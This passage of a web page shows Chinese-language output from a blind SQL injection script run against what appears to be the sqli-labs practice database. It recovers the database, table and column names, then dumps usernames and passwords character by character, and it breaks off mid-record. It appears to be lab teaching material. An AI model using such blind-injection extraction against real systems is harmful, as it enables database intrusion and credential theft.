class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br></pre></td><td class="code"><pre><code class="hljs prolog">[+] 长度为: <span class="hljs-number">8</span><br>[+] 获取第 <span class="hljs-number">1</span> 个字符...<br>[+] 当前结果: s<br>[+] 获取第 <span class="hljs-number">2</span> 个字符...<br>[+] 当前结果: se<br>[+] 获取第 <span class="hljs-number">3</span> 个字符...<br>[+] 当前结果: sec<br>[+] 获取第 <span class="hljs-number">4</span> 个字符...<br>[+] 当前结果: secu<br>[+] 获取第 <span class="hljs-number">5</span> 个字符...<br>[+] 当前结果: secur<br>[+] 获取第 <span class="hljs-number">6</span> 个字符...<br>[+] 当前结果: securi<br>[+] 获取第 <span class="hljs-number">7</span> 个字符...<br>[+] 当前结果: securit<br>[+] 获取第 <span class="hljs-number">8</span> 个字符...<br>[+] 当前结果: security<br>[+] 数据库名: security<br>[+] 表数量: <span class="hljs-number">4</span><br>[+] 长度为: <span class="hljs-number">6</span><br>[+] 获取第 <span class="hljs-number">1</span> 个字符...<br>[+] 当前结果: e<br>[+] 获取第 <span class="hljs-number">2</span> 个字符...<br>[+] 当前结果: em<br>[+] 获取第 <span class="hljs-number">3</span> 个字符...<br>[+] 当前结果: ema<br>[+] 获取第 <span class="hljs-number">4</span> 个字符...<br>[+] 当前结果: emai<br>[+] 获取第 <span class="hljs-number">5</span> 个字符...<br>[+] 当前结果: email<br>[+] 获取第 <span class="hljs-number">6</span> 个字符...<br>[+] 当前结果: emails<br>[+] 表名: emails<br>[+] 长度为: <span class="hljs-number">8</span><br>[+] 获取第 <span class="hljs-number">1</span> 个字符...<br>[+] 当前结果: r<br>[+] 获取第 <span class="hljs-number">2</span> 个字符...<br>[+] 当前结果: re<br>[+] 获取第 <span class="hljs-number">3</span> 个字符...<br>[+] 当前结果: ref<br>[+] 获取第 <span class="hljs-number">4</span> 个字符...<br>[+] 当前结果: refe<br>[+] 获取第 <span class="hljs-number">5</span> 个字符...<br>[+] 当前结果: refer<br>[+] 获取第 <span class="hljs-number">6</span> 个字符...<br>[+] 当前结果: refere<br>[+] 获取第 <span class="hljs-number">7</span> 个字符...<br>[+] 当前结果: referer<br>[+] 获取第 <span class="hljs-number">8</span> 个字符...<br>[+] 当前结果: referers<br>[+] 表名: referers<br>[+] 长度为: <span class="hljs-number">7</span><br>[+] 获取第 <span class="hljs-number">1</span> 个字符...<br>[+] 当前结果: u<br>[+] 获取第 <span class="hljs-number">2</span> 个字符...<br>[+] 当前结果: ua<br>[+] 获取第 <span class="hljs-number">3</span> 个字符...<br>[+] 当前结果: uag<br>[+] 获取第 <span class="hljs-number">4</span> 个字符...<br>[+] 当前结果: uage<br>[+] 获取第 <span class="hljs-number">5</span> 个字符...<br>[+] 当前结果: uagen<br>[+] 获取第 <span class="hljs-number">6</span> 个字符...<br>[+] 当前结果: uagent<br>[+] 获取第 <span class="hljs-number">7</span> 个字符...<br>[+] 当前结果: uagents<br>[+] 表名: uagents<br>[+] 长度为: <span class="hljs-number">5</span><br>[+] 获取第 <span class="hljs-number">1</span> 个字符...<br>[+] 当前结果: u<br>[+] 获取第 <span class="hljs-number">2</span> 个字符...<br>[+] 当前结果: us<br>[+] 获取第 <span class="hljs-number">3</span> 个字符...<br>[+] 当前结果: use<br>[+] 获取第 <span class="hljs-number">4</span> 个字符...<br>[+] 当前结果: user<br>[+] 获取第 <span class="hljs-number">5</span> 个字符...<br>[+] 当前结果: users<br>[+] 表名: users<br>[+] 获取users表的字段...<br>[+] 字段数量: <span class="hljs-number">3</span><br>[+] 长度为: <span class="hljs-number">2</span><br>[+] 获取第 <span class="hljs-number">1</span> 个字符...<br>[+] 当前结果: i<br>[+] 获取第 <span class="hljs-number">2</span> 个字符...<br>[+] 当前结果: id<br>[+] 字段名: id<br>[+] 长度为: <span class="hljs-number">8</span><br>[+] 获取第 <span class="hljs-number">1</span> 个字符...<br>[+] 当前结果: u<br>[+] 获取第 <span class="hljs-number">2</span> 个字符...<br>[+] 当前结果: us<br>[+] 获取第 <span class="hljs-number">3</span> 个字符...<br>[+] 当前结果: use<br>[+] 获取第 <span class="hljs-number">4</span> 个字符...<br>[+] 当前结果: user<br>[+] 获取第 <span class="hljs-number">5</span> 个字符...<br>[+] 当前结果: usern<br>[+] 获取第 <span class="hljs-number">6</span> 个字符...<br>[+] 当前结果: userna<br>[+] 获取第 <span class="hljs-number">7</span> 个字符...<br>[+] 当前结果: usernam<br>[+] 获取第 <span class="hljs-number">8</span> 个字符...<br>[+] 当前结果: username<br>[+] 字段名: username<br>[+] 长度为: <span class="hljs-number">8</span><br>[+] 获取第 <span class="hljs-number">1</span> 个字符...<br>[+] 当前结果: p<br>[+] 获取第 <span class="hljs-number">2</span> 个字符...<br>[+] 当前结果: pa<br>[+] 获取第 <span class="hljs-number">3</span> 个字符...<br>[+] 当前结果: pas<br>[+] 获取第 <span class="hljs-number">4</span> 个字符...<br>[+] 当前结果: pass<br>[+] 获取第 <span class="hljs-number">5</span> 个字符...<br>[+] 当前结果: passw<br>[+] 获取第 <span class="hljs-number">6</span> 个字符...<br>[+] 当前结果: passwo<br>[+] 获取第 <span class="hljs-number">7</span> 个字符...<br>[+] 当前结果: passwor<br>[+] 获取第 <span class="hljs-number">8</span> 个字符...<br>[+] 当前结果: password<br>[+] 字段名: password<br>[+] 获取users表的数据...<br>[+] 获取字段: username<br>[+] 数据条数: <span class="hljs-number">13</span><br>[+] 长度为: <span class="hljs-number">4</span><br>[+] 获取第 <span class="hljs-number">1</span> 个字符...<br>[+] 当前结果: d<br>[+] 获取第 <span class="hljs-number">2</span> 个字符...<br>[+] 当前结果: du<br>[+] 获取第 <span class="hljs-number">3</span> 个字符...<br>[+] 当前结果: dum<br>[+] 获取第 <span class="hljs-number">4</span> 个字符...<br>[+] 当前结果: dumb<br>[+] 数据[<span class="hljs-number">1</span>]: dumb<br>[+] 长度为: <span class="hljs-number">8</span><br>[+] 获取第 <span class="hljs-number">1</span> 个字符...<br>[+] 当前结果: a<br>[+] 获取第 <span class="hljs-number">2</span> 个字符...<br>[+] 当前结果: an<br>[+] 获取第 <span class="hljs-number">3</span> 个字符...<br>[+] 当前结果: ang<br>[+] 获取第 <span class="hljs-number">4</span> 个字符...<br>[+] 当前结果: ange<br>[+] 获取第 <span class="hljs-number">5</span> 个字符...<br>[+] 当前结果: angel<br>[+] 获取第 <span class="hljs-number">6</span> 个字符...<br>[+] 当前结果: angeli<br>[+] 获取第 <span class="hljs-number">7</span> 个字符...<br>[+] 当前结果: angelin<br>[+] 获取第 <span class="hljs-number">8</span> 个字符...<br>[+] 当前结果: angelina<br>[+] 数据[<span class="hljs-number">2</span>]: angelina<br>[+] 长度为: <span class="hljs-number">5</span><br>[+] 获取第 <span class="hljs-number">1</span> 个字符...<br>[+] 当前结果: d<br>[+] 获取第 <span class="hljs-number">2</span> 个字符...<br>[+] 当前结果: du<br>[+] 获取第 <span class="hljs-number">3</span> 个字符...<br>[+] 当前结果: dum<br>[+] 获取第 <span class="hljs-number">4</span> 个字符...<br>[+] 当前结果: dumm<br>[+] 获取第 <span class="hljs-number">5</span> 个字符...<br>[+] 当前结果: dummy<br>[+] 数据[<span class="hljs-number">3</span>]: dummy<br>[+] 长度为: <span class="hljs-number">6</span><br>[+] 获取第 <span class="hljs-number">1</span> 个字符...<br>[+] 当前结果: s<br>[+] 获取第 <span class="hljs-number">2</span> 个字符...<br>[+] 当前结果: se<br>[+] 获取第 <span class="hljs-number">3</span> 个字符...<br>[+] 当前结果: sec<br>[+] 获取第 <span class="hljs-number">4</span> 个字符...<br>[+] 当前结果: secu<br>[+] 获取第 <span class="hljs-number">5</span> 个字符...<br>[+] 当前结果: secur<br>[+] 获取第 <span class="hljs-number">6</span> 个字符...<br>[+] 当前结果: secure<br>[+] 数据[<span class="hljs-number">4</span>]: secure<br>[+] 长度为: <span class="hljs-number">6</span><br>[+] 获取第 <span class="hljs-number">1</span> 个字符...<br>[+] 当前结果: s<br>[+] 获取第 <span class="hljs-number">2</span> 个字符...<br>[+] 当前结果: st<br>[+] 获取第 <span class="hljs-number">3</span> 个字符...<br>[+] 当前结果: stu<br>[+] 获取第 <span class="hljs-number">4</span> 个字符...<br>[+] 当前结果: stup<br>[+] 获取第 <span class="hljs-number">5</span> 个字符...<br>[+] 当前结果: stupi<br>[+] 获取第 <span class="hljs-number">6</span> 个字符...<br>[+] 当前结果: stupid<br>[+] 数据[<span class="hljs-number">5</span>]: stupid<br>[+] 长度为: <span class="hljs-number">8</span><br>[+] 获取第 <span class="hljs-number">1</span> 个字符...<br>[+] 当前结果: s<br>[+] 获取第 <span class="hljs-number">2</span> 个字符...<br>[+] 当前结果: su<br>[+] 获取第 <span class="hljs-number">3</span> 个字符...<br>[+] 当前结果: sup<br>[+] 获取第 <span class="hljs-number">4</span> 个字符...<br>[+] 当前结果: supe<br>[+] 获取第 <span class="hljs-number">5</span> 个字符...<br>[+] 当前结果: super<br>[+] 获取第 <span class="hljs-number">6</span> 个字符...<br>[+] 当前结果: superm<br>[+] 获取第 <span class="hljs-number">7</span> 个字符...<br>[+] 当前结果: superma<br>[+] 获取第 <span class="hljs-number">8</span> 个字符...<br>[+] 当前结果: superman<br>[+] 数据[<span class="hljs-number">6</span>]: superman<br>[+] 长度为: <span class="hljs-number">6</span><br>[+] 获取第 <span class="hljs-number">1</span> 个字符...<br>[+] 当前结果: b<br>[+] 获取第 <span class="hljs-number">2</span> 个字符...<br>[+] 当前结果: ba<br>[+] 获取第 <span class="hljs-number">3</span> 个字符...<br>[+] 当前结果: bat<br>[+] 获取第 <span class="hljs-number">4</span> 个字符...<br>[+] 当前结果: batm<br>[+] 获取第 <span class="hljs-number">5</span> 个字符...<br>[+] 当前结果: batma<br>[+] 获取第 <span class="hljs-number">6</span> 个字符...<br>[+] 当前结果: batman<br>[+] 数据[<span class="hljs-number">7</span>]: batman<br>[+] 长度为: <span class="hljs-number">5</span><br>[+] 获取第 <span class="hljs-number">1</span> 个字符...<br>[+] 当前结果: a<br>[+] 获取第 <span class="hljs-number">2</span> 个字符...<br>[+] 当前结果: ad<br>[+] 获取第 <span class="hljs-number">3</span> 个字符...<br>[+] 当前结果: adm<br>[+] 获取第 <span class="hljs-number">4</span> 个字符...<br>[+] 当前结果: admi<br>[+] 获取第 <span class="hljs-number">5</span> 个字符...<br>[+] 当前结果: admin<br>[+] 数据[<span class="hljs-number">8</span>]: admin<br>[+] 长度为: <span class="hljs-number">6</span><br>[+] 获取第 <span class="hljs-number">1</span> 个字符...<br>[+] 当前结果: a<br>[+] 获取第 <span class="hljs-number">2</span> 个字符...<br>[+] 当前结果: ad<br>[+] 获取第 <span class="hljs-number">3</span> 个字符...<br>[+] 当前结果: adm<br>[+] 获取第 <span class="hljs-number">4</span> 个字符...<br>[+] 当前结果: admi<br>[+] 获取第 <span class="hljs-number">5</span> 个字符...<br>[+] 当前结果: admin<br>[+] 获取第 <span class="hljs-number">6</span> 个字符...<br>[+] 当前结果: admin1<br>[+] 数据[<span class="hljs-number">9</span>]: admin1<br>[+] 长度为: <span class="hljs-number">6</span><br>[+] 获取第 <span class="hljs-number">1</span> 个字符...<br>[+] 当前结果: a<br>[+] 获取第 <span class="hljs-number">2</span> 个字符...<br>[+] 当前结果: ad<br>[+] 获取第 <span class="hljs-number">3</span> 个字符...<br>[+] 当前结果: adm<br>[+] 获取第 <span class="hljs-number">4</span> 个字符...<br>[+] 当前结果: admi<br>[+] 获取第 <span class="hljs-number">5</span> 个字符...<br>[+] 当前结果: admin<br>[+] 获取第 <span class="hljs-number">6</span> 个字符...<br>[+] 当前结果: admin2<br>[+] 数据[<span class="hljs-number">10</span>]: admin2<br>[+] 长度为: <span class="hljs-number">6</span><br>[+] 获取第 <span class="hljs-number">1</span> 个字符...<br>[+] 当前结果: a<br>[+] 获取第 <span class="hljs-number">2</span> 个字符...<br>[+] 当前结果: ad<br>[+] 获取第 <span class="hljs-number">3</span> 个字符...<br>[+] 当前结果: adm<br>[+] 获取第 <span class="hljs-number">4</span> 个字符...<br>[+] 当前结果: admi<br>[+] 获取第 <span class="hljs-number">5</span> 个字符...<br>[+] 当前结果: admin<br>[+] 获取第 <span class="hljs-number">6</span> 个字符...<br>[+] 当前结果: admin3<br>[+] 数据[<span class="hljs-number">11</span>]: admin3<br>[+] 长度为: <span class="hljs-number">7</span><br>[+] 获取第 <span class="hljs-number">1</span> 个字符...<br>[+] 当前结果: d<br>[+] 获取第 <span class="hljs-number">2</span> 个字符...<br>[+] 当前结果: dh<br>[+] 获取第 <span class="hljs-number">3</span> 个字符...<br>[+] 当前结果: dha<br>[+] 获取第 <span class="hljs-number">4</span> 个字符...<br>[+] 当前结果: dhak<br>[+] 获取第 <span class="hljs-number">5</span> 个字符...<br>[+] 当前结果: dhakk<br>[+] 获取第 <span class="hljs-number">6</span> 个字符...<br>[+] 当前结果: dhakka<br>[+] 获取第 <span class="hljs-number">7</span> 个字符...<br>[+] 当前结果: dhakkan<br>[+] 数据[<span class="hljs-number">12</span>]: dhakkan<br>[+] 长度为: <span class="hljs-number">6</span><br>[+] 获取第 <span class="hljs-number">1</span> 个字符...<br>[+] 当前结果: a<br>[+] 获取第 <span class="hljs-number">2</span> 个字符...<br>[+] 当前结果: ad<br>[+] 获取第 <span class="hljs-number">3</span> 个字符...<br>[+] 当前结果: adm<br>[+] 获取第 <span class="hljs-number">4</span> 个字符...<br>[+] 当前结果: admi<br>[+] 获取第 <span class="hljs-number">5</span> 个字符...<br>[+] 当前结果: admin<br>[+] 获取第 <span class="hljs-number">6</span> 个字符...<br>[+] 当前结果: admin4<br>[+] 数据[<span class="hljs-number">13</span>]: admin4<br>[+] 获取字段: password<br>[+] 数据条数: <span class="hljs-number">13</span><br>[+] 长度为: <span class="hljs-number">4</span><br>[+] 获取第 <span class="hljs-number">1</span> 个字符...<br>[+] 当前结果: d<br>[+] 获取第 <span class="hljs-number">2</span> 个字符...<br>[+] 当前结果: du<br>[+] 获取第 <span class="hljs-number">3</span> 个字符...<br>[+] 当前结果: dum<br>[+] 获取第 <span class="hljs-number">4</span> 个字符...<br>[+] 当前结果: dumb<br>[+] 数据[<span class="hljs-number">1</span>]: dumb<br>[+] 长度为: <span class="hljs-number">10</span><br>[+] 获取第 <span class="hljs-number">1</span> 个字符...<br>[+] 当前结果: i<br>[+] 获取第 <span class="hljs-number">2</span> 个字符...<br>[+] 当前结果: i-<br>[+] 获取第 <span class="hljs-number">3</span> 个字符...<br>[+] 当前结果: i-k<br>[+] 获取第 <span class="hljs-number">4</span> 个字符...<br>[+] 当前结果: i-ki<br>[+] 获取第 <span class="hljs-number">5</span> 个字符...<br>[+] 当前结果: i-kil<br>[+] 获取第 <span class="hljs-number">6</span> 个字符...<br>[+] 当前结果: i-kill<br>[+] 获取第 <span class="hljs-number">7</span> 个字符...<br>[+] 当前结果: i-kill-<br>[+] 获取第 <span class="hljs-number">8</span> 个字符...<br>[+] 当前结果: i-kill-y<br>[+] 获取第 <span class="hljs-number">9</span> 个字符...<br>[+] 当前结果: i-kill-yo<br>[+] 获取第 <span class="hljs-number">10</span> 个字符...<br>[+] 当前结果: i-kill-you<br>[+] 数据[<span class="hljs-number">2</span>]: i-kill-you<br>[+] 长度为: <span class="hljs-number">8</span><br>[+] 获取第 <span class="hljs-number">1</span> 个字符...<br>[+] 当前结果: p<br>[+] 获取第 <span class="hljs-number">2</span> 个字符...<br>[+] 当前结果: p@<br>[+] 获取第 <span class="hljs-number">3</span> 个字符...<br>[+] 当前结果: p@s<br>[+] 获取第 <span class="hljs-number">4</span> 个字符...<br>[+] 当前结果: p@ss<br>[+] 获取第 <span class="hljs-number">5</span> 个字符...<br>[+] 当前结果: p@ssw<br>[+] 获取第 <span class="hljs-number">6</span> 个字符...<br>[+] 当前结果: p@sswo<br>[+] 获取第 <span class="hljs-number">7</span> 个字符...<br>[+] 当前结果: p@sswor<br>[+] 获取第 <span class="hljs-number">8</span> 个字符...<br>[+] 当前结果: p@ssword<br>[+] 数据[<span class="hljs-number">3</span>]: p@ssword<br>[+] 长度为: <span class="hljs-number">6</span><br>[+] 获取第 <span class="hljs-number">1</span> 个字符...<br>[+] 当前结果: c<br>[+] 获取第 <span class="hljs-number">2</span> 个字符...<br>[+] 当前结果: cr<br>[+] 获取第 <span class="hljs-number">3</span> 个字符...<br>[+] 当前结果: cra<br>[+] 获取第 <span class="hljs-number">4</span> 个字符...<br>[+] 当前结果: crap<br>[+] 获取第 <span class="hljs-number">5</span> 个字符...<br>[+] 当前结果: crapp<br>[+] 获取第 <span class="hljs-number">6</span> 个字符...<br>[+] 当前结果: crappy<br>[+] 数据[<span class="hljs-number">4</span>]: crappy<br>[+] 长度为: <span class="hljs-number">9</span><br>[+] 获取第 <span class="hljs-number">1</span> 个字符...<br>[+] 当前结果: s<br>[+] 获取第 <span class="hljs-number">2</span> 个字符...<br>[+] 当前结果: st<br>[+] 获取第 <span class="hljs-number">3</span> 个字符...<br>[+] 当前结果: stu<br>[+] 获取第 <span class="hljs-number">4</span> 个字符...<br>[+] 当前结果: stup<br>[+] 获取第 <span class="hljs-number">5</span> 个字符...<br>[+] 当前结果: stupi<br>[+] 获取第 <span class="hljs-number">6</span> 个字符...<br>[+] 当前结果: stupid<br>[+] 获取第 <span class="hljs-number">7</span> 个字符...<br>[+] 当前结果: stupidi<br>[+] 获取第 <span class="hljs-number">8</span> 个字符...<br>[+] 当前结果: stupidit<br>[+] 获取第 <span class="hljs-number">9</span> 个字符...<br>[+] 当前结果: stupidity<br>[+] 数据[<span class="hljs-number">5</span>]: stupidity<br>[+] 长度为: <span class="hljs-number">7</span><br>[+] 获取第 <span class="hljs-number">1</span> 个字符...<br>[+] 当前结果: g<br>[+] 获取第 <span class="hljs-number">2</span> 个字符...<br>[+] 当前结果: ge<br>[+] 获取第 <span class="hljs-number">3</span> 个字符...<br>[+] 当前结果: gen<br>[+] 获取第 <span class="hljs-number">4</span> 个字符...<br>[+] 当前结果: geni<br>[+] 获取第 <span class="hljs-number">5</span> 个字符...<br>[+] 当前结果: genio<br>[+] 获取第 <span class="hljs-number">6</span> 个字符...<br>[+] 当前结果: geniou<br>[+] 获取第 <span class="hljs-number">7</span> 个字符...<br>[+] 当前结果: genious<br>[+] 数据[<span class="hljs-number">6</span>]: genious<br>[+] 长度为: <span class="hljs-number">6</span><br>[+] 获取第 <span class="hljs-number">1</span> 个字符...<br>[+] 当前结果: m<br>[+] 获取第 <span class="hljs-number">2</span> 个字符...<br>[+] 当前结果: mo<br>[+] 获取第 <span class="hljs-number">3</span> 个字符...<br>[+] 当前结果: mob<br>[+] 获取第 <span class="hljs-number">4</span> 个字符...<br>[+] 当前结果: mob!<br>[+] 获取第 <span class="hljs-number">5</span> 个字符...<br>[+] 当前结果: mob!l<br>[+] 获取第 <span class="hljs-number">6</span> 个字符...<br>[+] 当前结果: mob!le<br>[+] 数据[<span class="hljs-number">7</span>]: mob!le<br>[+] 长度为: <span class="hljs-number">5</span><br>[+] 获取第 <span class="hljs-number">1</span> 个字符...<br>[+] 当前结果: a<br>[+] 获取第 <span class="hljs-number">2</span> 个字符...<br>[+] 当前结果: ad<br>[+] 获取第 <span class="hljs-number">3</span> 个字符...<br>[+] 当前结果: adm<br>[+] 获取第 <span class="hljs-number">4</span> 个字符...<br>[+] 当前结果: admi<br>[+] 获取第 <span class="hljs-number">5</span> 个字符...<br>[+] 当前结果: admin<br>[+] 数据[<span class="hljs-number">8</span>]: admin<br>[+] 长度为: <span class="hljs-number">6</span><br>[+] 获取第 <span class="hljs-number">1</span> 个字符...<br>[+] 当前结果: a<br>[+] 获取第 <span class="hljs-number">2</span> 个字符...<br>[+] 当前结果: ad<br>[+] 获取第 <span class="hljs-number">3</span> 个字符...<br>[+] 当前结果: adm<br>[+] 获取第 <span class="hljs-number">4</span> 个字符...<br>[+] 当前结果: admi<br>[+] 获取第 <span class="hljs-number">5</span> 个字符...<br>[+] 当前结果: admin<br>[+] 获取第 <span class="hljs-number">6</span> 个字符...<br>[+] 当前结果: admin1<br>[+] 数据[<span class="hljs-number">9</span>]: admin1<br>[+] 长度为: <span class="hljs-number">6</span><br>[+] 获取第 <span class="hljs-number">1</span> 个字符...<br>[+] 当前结果: a<br>[+] 获取第 <span class="hljs-number">2</span> 个字符...<br>[+] 当前结果: ad<br>[+] 获取第 <span class="hljs-number">3</span> 个字符...<br>[+] 当前结果: adm<br>[+] 获取第 <span class="hljs-number">4</span> 个字符...<br>[+] 当前结果: admi<br>[+] 获取第 <span class="hljs-number">5</span> 个字符...<br>[+] 当前结果: admin<br>[+] 获取第 <span class="hljs-number">6</span> 个字符...<br>[+] 当前结果: admin2<br>[+] 数据[<span class="hljs-number">10</span>]: admin2<br>[+] 长度为: <span class="hljs-number">6</span><br>[+] 获取第 <span class="hljs-number">1</span> 个字符...<br>[+] 当前结果: a<br>[+] 获取第 <span class="hljs-number">2</span> 个字符...<br>[+] 当前结果: ad<br>[+] 获取第 <span class="hljs-number">3</span> 个字符...<br>[+] 当前结果: adm<br>[+] 获取第 <span class="hljs-number">4</span> 个字符...<br>[+] 当前结果: admi<br>[+] 获取第 <span class="hljs-number">5</span> 个字符...<br>[+] 当前结果: admin<br>[+] 获取第 <span class="hljs-number">6</span> 个字符...<br>[+] 当前结果: admin3<br>[+] 数据[<span class="hljs-number">11</span>]: admin3<br>[+] 长度为: <span class="hljs-number">5</span><br>[+] 获取第 <span class="hljs-number">1</span> 个字符...<br>[+] 当前结果: d<br>[+] 获取第 <span class="hljs-number">2</span> 个字符...<br>[+] 当前结果: du<br>[+] 获取第 <span class="hljs-number">3</span> 个字符...<br>[+] 当前结果: dum<br>[+] 获取第 <span class="hljs-number">4</span> 个字符...<br>[+] 当前结果: dumb<br>[+] 获取第 <span class="hljs-number">5</span> 个字符...<br>[+] 当前结果: dumbo<br>[+] 数据[<span class="hljs-number">12</span>]: dumbo<br>[+] 长度为: <span class="hljs-number">6</span><br>[+] 获取第 <span class="hljs-number">1</span> 个字符...<br>[+] 当前结果: a<br>[+] 获取第 <span class="hljs-number">2</span> 个字符...<br>[+] 当前结果: ad<br>[+] 获取第 <span class="hljs-number">3</span> 个字符...<br>[+] 当前结果: adm<br>[+] 获取第 <span class="hljs-number">4</span> 个字符...<br>[+] 当前结果: 